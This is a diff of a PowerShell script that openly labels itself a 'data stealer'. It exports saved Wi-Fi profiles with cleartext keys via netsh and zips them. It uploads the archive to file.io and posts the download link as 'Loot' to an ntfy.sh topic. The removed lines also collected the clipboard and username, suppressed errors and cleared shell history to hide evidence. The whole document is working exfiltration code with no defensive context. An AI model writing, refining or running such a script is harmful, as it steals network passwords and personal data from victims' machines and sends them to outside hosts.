@@ -1,27 +1,28 @@
-$ErrorActionPreference = "SilentlyContinue"
-# Pick a random secret name for your ntfy topic
-$topic = "data_stwealer_hideen_" 
+$topic = "data_stwealer_hideen_"
 
-# 1. Create Workspace
-$dir = "$env:TEMP\$( -join ((65..90) | Get-Random -Count 8 | % {[char]$_}))"
-mkdir $dir -Force | Out-Null
-$zip = "$dir.zip"
+# 1. Setup
+$dir = "$env:TEMP\LootBox"
+if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
+mkdir $dir | Out-Null
+$zip = "$env:TEMP\package.zip"
+if (Test-Path $zip) { Remove-Item -Force $zip }
 
-# 2. Gather Loot
+# 2. Export
 netsh wlan export profile folder=$dir key=clear | Out-Null
-Get-Clipboard > "$dir\clip.txt"
-"User: $env:USERNAME" > "$dir\id.txt"
 
-# 3. Zip it
+# 3. Zip
 Add-Type -Assembly "System.IO.Compression.FileSystem"
 [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
 
-# 4. Upload to File.io (Drop) & Ntfy.sh (Alert)
-$file = Invoke-RestMethod -Uri "https://file.io" -Method Post -InFile $zip
-$link = $file.link
-Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
+# 4. Upload
+if (Test-Path $zip) {
+    $response = curl.exe -F "file=@$zip" https://file.io
+    if ($response -match '"link":"([^"]+)"') {
+        $link = $matches[1]
+        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
+    }
+}
 
-# 5. Burn Evidence
+# 5. Debug Stay
+Read-Host "Press Enter to Finish"
 Remove-Item -Recurse -Force $dir, $zip
-Clear-History
-exit
